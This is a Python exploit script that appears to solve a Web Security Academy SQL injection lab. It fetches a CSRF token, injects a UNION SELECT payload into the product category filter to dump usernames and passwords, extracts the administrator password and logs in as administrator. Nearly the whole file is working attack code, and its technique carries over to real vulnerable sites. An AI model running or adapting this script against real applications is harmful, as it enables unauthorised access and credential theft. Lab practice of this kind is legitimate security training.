#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
from bs4 import BeautifulSoup
import re
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""SQL Injection Web Security Academy

Example usage with proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT NULL,username|| '-' ||password FROM users--" -p 127.0.0.1:8080

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT NULL,username|| '-' ||password FROM users--" 

""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: \' UNION SELECT NULL,username|| \'-\' ||password FROM users--', required=True)
parser.add_argument('-p', '--proxy', help='Proxy, Example: 127.0.0.1:8080', required=False)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command
s = requests.Session()

def get_csrf(s, url):
    path = '/login'
    r = s.get(url + path, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    global csrf
    csrf = soup.find("input")['value']
    return csrf

def sqli(url, command):
    path = '/filter'
    params = {
        'category': 'Pets' + command
    }
    if args.proxy:
        args.proxy=str(args.proxy)
        proxies = {
            'http': 'http://' + args.proxy,
            'https': 'http://' + args.proxy,
        }
        s.get(url + path, params=params, verify=False, proxies=proxies)
    else:
        r = s.get(url + path, params=params, verify=False)
        # verify the response returns 200 code
        if (r.status_code == 200):
            for line in r.content.splitlines():
                l = line.decode("utf-8")
                res = re.search(r'\b[0-9a-z]{20}\b', l)
                if (b'administrator' in line):
                    if (type(res).__name__ == 'Match'):
                        str_line = str(line)
                        pwd = str_line.split("administrator-", 1)[1]
                        global admin_pwd
                        admin_pwd = pwd.split("</th>'")[0]
                    else: 
                        pass
        else: 
            print("(-) SQL Injection Failed")
        
def login(url, csrf, admin_pwd):
    data = {
        'csrf': csrf,
        'username': 'administrator',
        'password': admin_pwd
    }
    s.post(url + '/login', data=data, verify=False)
    r1 = s.get(url, verify=False)
    # verify the response contains Congratulations, you solved the lab!
    if (b'Congratulations, you solved the lab!' in r1.content):
        print("(+) SQL Injection Successful!")
        subprocess.call(["firefox", url])
        
def main():
    
    print("(+) Exploiting SQL Injection")

    get_csrf(s, url)
        
    sqli(url, command)

    login(url, csrf, admin_pwd)

if __name__ == "__main__":
    main()
